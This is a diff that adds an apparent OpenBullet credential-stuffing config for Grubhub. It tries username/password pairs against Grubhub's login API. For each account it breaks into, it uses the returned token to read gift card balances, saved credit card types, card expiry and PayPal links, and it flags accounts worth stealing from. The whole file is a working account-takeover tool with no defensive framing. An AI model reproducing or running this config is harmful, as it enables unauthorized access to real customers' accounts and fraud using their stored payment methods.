@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "GRUB",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-26T14:48:44.5425948-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "",
+  "Version": "1.2.0",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function S4() {
+    return (((1+Math.random())*0x10000)|0).toString(16).substring(1); 
+}
+// then to call it, plus stitch in '4' in the third group
+guid = (S4() + S4() + "-" + S4() + "-4" + S4().substr(0,3) + "-" + S4() + "-" + S4() + S4() + S4()).toLowerCase();
+guid = guid;
+END SCRIPT -> VARS "guid"
+
+#POST REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"beta_UmWlpstzQSFmocLy3h1UieYcVST\",\"device_id\":-1806833574,\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 144" 
+  HEADER "content-type: application/json;charset=UTF-8" 
+  HEADER "origin: https://www.grubhub.com" 
+  HEADER "referer: https://www.grubhub.com/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "authorization: Bearer <guid>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "first_name" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "first_name" 
+  KEYCHAIN Retry OR 
+    KEY "pxuuid" 
+
+#TOKEN PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" -> VAR "TOKEN" 
+
+#UID PARSE "<SOURCE>" LR "\"ud_id\":\"" "\"" -> VAR "UID" 
+
+#GIFTCARD REQUEST GET "https://api-gtm.grubhub.com/codes/vault/<UID>/giftcards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <TOKEN>" 
+
+#CAPTURE PARSE "<SOURCE>" LR "{\"gift_cards\":[],\"total_amount_remaining\":" "}" -> VAR "GC" 
+
+#CARDS REQUEST GET "https://api-gtm.grubhub.com/payments/<UID>/credit_card" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <TOKEN>" 
+
+#CARDS PARSE "<SOURCE>" LR "credit_card_type\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "CC" 
+
+#EXPIRED? PARSE "<SOURCE>" LR "expired\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "EXPIRED" 
+
+#PAYPAL REQUEST GET "https://api-gtm.grubhub.com/payments/<UID>/paypal_express" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "authorization: Bearer <TOKEN>" 
+
+#CAPTURE PARSE "<SOURCE>" LR "id" ":\"" -> VAR "shit" 
+
+#PAYPAL? FUNCTION Replace "\"" "YES" "<shit>" -> CAP "PAYPAL" 
+
+#$GC PARSE "$<GC>" LR "" "" CreateEmpty=FALSE -> CAP "GC BALANCE" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<CC>" Exists 
+    KEY "<shit>" Contains "\"" 
+    KEY "<GC>" GreaterThan "0" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<CC>" DoesNotExist 
+    KEY "<PAYPAL>" DoesNotExist 
+    KEY "<GC>" Contains "0" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<EXPIRED>" DoesNotContain "false" 
+    KEY "<PAYPAL>" DoesNotExist 
+    KEY "<GC>" Contains "0" 
+
